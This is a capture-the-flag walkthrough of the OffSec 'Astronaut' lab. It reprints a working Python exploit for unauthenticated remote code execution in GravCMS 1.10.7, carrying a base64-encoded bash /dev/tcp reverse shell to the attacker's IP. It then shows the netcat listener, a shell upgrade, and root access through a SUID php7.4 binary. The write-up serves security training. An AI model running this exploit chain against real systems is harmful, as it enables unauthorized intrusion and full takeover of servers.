# Astronaut

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Difficulty: Easy
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 10
Lab Description:
This lab demonstrates exploiting an unauthenticated arbitrary YAML write/update vulnerability in Grav 
CMS to achieve Remote Code Execution (RCE). Learners escalate privileges by leveraging a SUID-enabled 
php7.4 binary, which allows command execution as root. This lab highlights misconfigured CMS systems, 
RCE exploitation via YAML manipulation, and SUID abuse for privilege escalation.
Released: 6 Apr 2023
```

Machine link: [https://portal.offsec.com/machine/astronaut-49479/overview/details](https://portal.offsec.com/machine/astronaut-49479/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all ports with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ export TARGET_IP=192.168.230.12 

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ sudo nmap -sV -sC -p- $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 15:42 CEST
Nmap scan report for 192.168.230.12
Host is up (0.031s latency).       
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION     
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                        
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-ls: Volume /               
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_                         
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Index of /      
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
                          
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds  
```

We have two services running and available:

- OpenSSH 8.2p1 on port 22
- Apache httpd 2.4.41 on port 80

### Check the web site

Browsing manually to port 80 shows a directory listing with on directory called `grav-admin`.  
Accessing `http://192.168.230.12/grav-admin/` shows a [Grav CMS](https://getgrav.org/) site

![Grav Web Page on Astronaut](Images/Grav_Web_Page_on_Astronaut.png)

### Search for available exploit

No version information were found but let's check for available exploits

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ searchsploit grav cms
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Grav CMS 1.4.2 Admin Plugin - Cross-Site Scripting                                                                                                    | php/webapps/42131.txt
Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross-Site Scripting                                                                    | php/webapps/49264.txt
Grav CMS 1.7.10 - Server-Side Template Injection (SSTI) (Authenticated)                                                                               | php/webapps/49961.py
Grav CMS 1.7.48 - Remote Code Execution (RCE)                                                                                                         | php/webapps/52402.txt
GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)                                                                                    | php/webapps/49973.py
GravCMS 1.10.7 - Unauthenticated Arbitrary File Write (Metasploit)                                                                                    | php/webapps/49788.rb
gravy media CMS 1.07 - Multiple Vulnerabilities                                                                                                       | php/webapps/8315.txt
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ searchsploit -m 49973               
  Exploit: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
      URL: https://www.exploit-db.com/exploits/49973
     Path: /usr/share/exploitdb/exploits/php/webapps/49973.py
    Codes: N/A
 Verified: True
File Type: ASCII text, with very long lines (429)
Copied to: /mnt/hgfs/OffSec_PG/PG_Practice/Astronaut/49973.py

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ cat 49973.py
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.1.2"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMy80NDQ0IDA+JjE='));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)   

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ echo -ne 'bash -i >& /dev/tcp/192.168.45.180/80 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4MC84MCAwPiYx  

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ vi 49973.py      

┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ cat 49973.py                                          
# Exploit Title: GravCMS 1.10.7 - Arbitrary YAML Write/Update (Unauthenticated) (2)
# Original Exploit Author: Mehmet Ince
# Vendor Homepage: https://getgrav.org
# Version: 1.10.7
# Tested on: Debian 10
# Author: legend

#/usr/bin/python3

import requests
import sys
import re
import base64
target= "http://192.168.230.12/grav-admin"
#Change base64 encoded value with with below command.
#echo -ne "bash -i >& /dev/tcp/192.168.1.3/4444 0>&1" | base64 -w0
payload=b"""/*<?php /**/
file_put_contents('/tmp/rev.sh',base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4MC84MCAwPiYx'));chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');
"""
s = requests.Session()
r = s.get(target+"/admin")
adminNonce = re.search(r'admin-nonce" value="(.*)"',r.text).group(1)
if adminNonce != "" :
    url = target + "/admin/tools/scheduler"
    data = "admin-nonce="+adminNonce
    data +='&task=SaveDefault&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'+base64.b64encode(payload).decode('utf-8')+'%22%29%29%3b&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d=&data%5bstatus%5d%5bncefs%5d=enabled&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = s.post(target+"/admin/config/scheduler",data=data,headers=headers)
```

### Get a reverse shell

Then we start a netcat listener on port 80

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ nc -lvnp 80 
listening on [any] 80 ...

```

And execute the exploit

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ python 49973.py    
```

Checking back to the netcat listener we have a connection

```bash
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ nc -lvnp 80 
listening on [any] 80 ...
connect to [192.168.45.180] from (UNKNOWN) [192.168.230.12] 37194
bash: cannot set terminal process group (339413): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gravity:~/html/grav-admin$ 
```

### Fix/upgrade the reverse shell

We don't have a proper shell though so let's fix that

```bash
www-data@gravity:~/html/grav-admin$ tty
tty
not a tty
www-data@gravity:~/html/grav-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@gravity:~/html/grav-admin$ ^Z
zsh: suspended  nc -lvnp 80
                                                                                                                                                                                        
┌──(kali㉿kali)-[/mnt/hgfs/OffSec_PG/PG_Practice/Astronaut]
└─$ stty raw -echo ; fg ; reset
[1]  + continued  nc -lvnp 80

www-data@gravity:~/html/grav-admin$ ^C
www-data@gravity:~/html/grav-admin$ ^C
www-data@gravity:~/html/grav-admin$ 
```

Now we have a proper shell that survives `Ctrl + C`!

### Enumeration for privesc

Next, we enumerate the system for privilege escalation opportunities.

First we check for SUID files

```bash
www-data@gravity:~/html/grav-admin$ find / -type f -perm /4000 2> /dev/null
/snap/core20/1852/usr/bin/chfn
/snap/core20/1852/usr/bin/chsh
/snap/core20/1852/usr/bin/gpasswd
/snap/core20/1852/usr/bin/mount
/snap/core20/1852/usr/bin/newgrp
/snap/core20/1852/usr/bin/passwd
/snap/core20/1852/usr/bin/su
/snap/core20/1852/usr/bin/sudo
/snap/core20/1852/usr/bin/umount
/snap/core20/1852/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1852/usr/lib/openssh/ssh-keysign
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
www-data@gravity:~/html/grav-admin$ 
```

The most interesting one in the list is `/usr/bin/php7.4`.

### Get root access

We can use ideas from [GTFOBins](https://gtfobins.github.io/gtfobins/php/) on how to proceed

```bash
www-data@gravity:~/html/grav-admin$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# 
```

### Get the root flag

Finally we get the only flag on the machine

```bash
# cd /root
# ls -l
total 12
-rw------- 1 root root    9 Apr  3  2023 flag1.txt
-rwx------ 1 root root   33 Sep  2 13:40 proof.txt
drwx------ 3 root root 4096 Jan 24  2023 snap
# cat proof.txt
4<REDACTED>e
# 
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [id - Linux manual page](https://man7.org/linux/man-pages/man1/id.1.html)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [nmap - Homepage](https://nmap.org/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [nmap - Manual page](https://nmap.org/book/man.html)
- [OpenSSH  - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [php - GTFOBins](https://gtfobins.github.io/gtfobins/php/)
- [PHP - Wikipedia](https://en.wikipedia.org/wiki/PHP)
- [searchsploit - Kali Tools](https://www.kali.org/tools/exploitdb/#searchsploit)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
